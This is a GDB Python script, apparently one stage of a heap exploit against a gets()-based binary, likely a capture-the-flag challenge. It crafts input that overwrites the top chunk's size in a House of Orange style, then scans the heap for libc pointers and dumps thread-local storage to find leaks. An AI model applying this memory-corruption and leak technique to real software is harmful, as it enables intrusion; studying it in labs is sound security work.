import gdb, struct
p64 = lambda x: struct.pack("<Q", x)

# HoO then take small chunks out of the freed top
OPS = [
    (0x10, b"\x00"*8),
    (0x10, p64(0) + p64(0) + p64(0xd31)),
    (0x1000, b"\x00"*8),
    (0x8, b"\x00"*8),      # op3: chunk @0x2d0, split; remainder @0x2f0
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("./_z_441/input.bin", "wb").write(build(OPS))

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        gdb.write("GETS#%d pkt=%#x\n" % (hits[0], rdi - 8))
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
try:
    gdb.execute("run < ./_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)

rdi = int(gdb.parse_and_eval("$rdi"))
pkt = rdi - 8
heap = pkt - 0x2e0   # heap base = pkt - 0x2e0 in this geometry
gdb.write("pkt=%#x heaplike=%#x\n" % (pkt, heap))
gdb.write("\n==== heap 0x290 .. 0x420 ====\n")
gdb.write(gdb.execute("x/40gx %#x" % (heap + 0x290), to_string=True))
gdb.write("\n==== scan heap 0x21000 for 0x7f-hex qwords ====\n")
data = gdb.selected_inferior().read_memory(heap, 0x21000).tobytes()
import re
found = []
for off in range(0, len(data) - 8, 8):
    v = struct.unpack_from("<Q", data, off)[0]
    if 0x7f0000000000 <= v < 0x800000000000:
        found.append((off, v))
for off, v in found[:60]:
    gdb.write("  heap+%#06x = %#x\n" % (off, v))
gdb.write("total libc-ish qwords: %d\n" % len(found))
gdb.write("\n==== TLS block ====\n")
fs = int(gdb.parse_and_eval("$fs_base"))
gdb.write("fs=%#x\n" % fs)
gdb.write(gdb.execute("x/64gx %#x" % (fs - 0x740), to_string=True))
